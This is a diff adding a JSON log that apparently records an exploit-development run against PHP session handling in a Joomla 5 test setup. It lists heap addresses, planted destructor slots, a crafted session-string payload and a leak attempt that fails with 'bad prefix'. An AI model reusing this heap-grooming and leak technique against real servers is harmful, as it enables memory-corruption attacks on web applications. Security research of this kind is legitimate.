@@ -1,0 +1,174 @@
+{
+ "label": "j0",
+ "master": 174553,
+ "started": 1792627802.286468,
+ "randomize_va_space": "2",
+ "total": 81920,
+ "used": -5125,
+ "worker0": 174555,
+ "gdb_armed": true,
+ "plant": {
+  "status": 200,
+  "head": "<br />\n<b>Fatal error</b>:  Allowed memory size of 2097152 bytes exhausted (tried to allocate 20480 bytes) in <b>/tmp/opencode/joomla5/exploit/sess.php</b> on line <b>2</b><br />\n<br />\n<b>Warning</b>",
+  "req": 1
+ },
+ "worker_after_plant": 174555,
+ "plant_req": {
+  "heap": 139667070517312,
+  "decodes": [
+   [
+    139667071123456,
+    64946
+   ]
+  ],
+  "tmps": [
+   {
+    "P": 139667071045632,
+    "last": 0,
+    "used": 0,
+    "next": 0
+   }
+  ],
+  "rets": [
+   {
+    "slot": 139667071107088,
+    "dtor": 139667071107072,
+    "off": 16,
+    "used_now": 1
+   }
+  ],
+  "bails": [
+   [
+    139667071045632,
+    1
+   ],
+   [
+    139667071045632,
+    1
+   ],
+   [
+    139667071045632,
+    1
+   ]
+  ],
+  "shutdown": {
+   "P": 139667071045632,
+   "last": 139667071107072,
+   "first": 139667071107072,
+   "used": 1,
+   "next": 0,
+   "level": 1
+  }
+ },
+ "P_plant": 139667071045632,
+ "B0_plant": 139667071107072,
+ "heap": 139667070517312,
+ "leak_geo": {
+  "total": 81920,
+  "L": 81856,
+  "boff": 62,
+  "base": 139667070971928,
+  "P": 139667071045632,
+  "X": 139667070971904,
+  "D": 139667071045760,
+  "used": -5125
+ },
+ "leak_seed": {
+  "path": "/tmp/opencode/joomla5/tmp/sess_tb1",
+  "len": 81920,
+  "sha1": "60ec96dd359f1d904f8fb3ae7c14ea5db3894d16"
+ },
+ "leak_trigger": {
+  "status": 502,
+  "head": "<html>\r\n<head><title>502 Bad Gateway</title></head>\r\n<body>\r\n<center><h1>502 Bad Gateway</h1></center>\r\n<hr><center>nginx/1.30.1</center>\r\n</body>\r\n</html>\r\n",
+  "req": 2
+ },
+ "worker_after_leak_trigger": 176053,
+ "leak_trigger_req": {
+  "heap": 139667070517312,
+  "decodes": [
+   [
+    139667070955520,
+    81920
+   ]
+  ],
+  "tmps": [
+   {
+    "P": 139667071045632,
+    "last": 139667071107072,
+    "used": 1,
+    "next": 0
+   },
+   {
+    "P": 139667071045632,
+    "last": 139667071107072,
+    "used": 2,
+    "next": 0
+   },
+   {
+    "P": 139667071045632,
+    "last": 139667071107072,
+    "used": 3,
+    "next": 0
+   }
+  ],
+  "rets": [
+   {
+    "slot": 139667071107104,
+    "dtor": 139667071107072,
+    "off": 32,
+    "used_now": 2
+   },
+   {
+    "slot": 139667071107120,
+    "dtor": 139667071107072,
+    "off": 48,
+    "used_now": 3
+   },
+   {
+    "slot": 139667071107136,
+    "dtor": 139667071107072,
+    "off": 64,
+    "used_now": 4
+   }
+  ],
+  "uvarstrs": [
+   {
+    "ptr": 139667070947392,
+    "rc": 1,
+    "len": 32
+   },
+   {
+    "ptr": 139667071041536,
+    "rc": 1,
+    "len": 81856
+   }
+  ],
+  "write": {
+   "val": 139667071123456,
+   "len": 82177,
+   "head": "537c693a303b4a7c693a303b4b7c733a38313835363a224141414141414141414141414141414141414141414141414141414141414141414141414141414141"
+  }
+ },
+ "X_measured": 139667070955520,
+ "S_dest_measured": 139667071107104,
+ "PS_WRITE": {
+  "val": 139667071123456,
+  "len": 82177,
+  "head": "537c693a303b4a7c693a303b4b7c733a38313835363a224141414141414141414141414141414141414141414141414141414141414141414141414141414141"
+ },
+ "bails": [],
+ "worker_after_leak_respawn": 176053,
+ "leak_get": {
+  "status": 200,
+  "len": 82177,
+  "attempt": 1
+ },
+ "leak_len": 82177,
+ "leak_sha1": "bb75a7fa678c9838a954bd3d88a18613a0eeada7",
+ "leak": {
+  "error": "bad prefix",
+  "head": "537c693a303b4a7c693a303b4b7c733a38313835363a22414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141"
+ },
+ "K_dest": null
+}
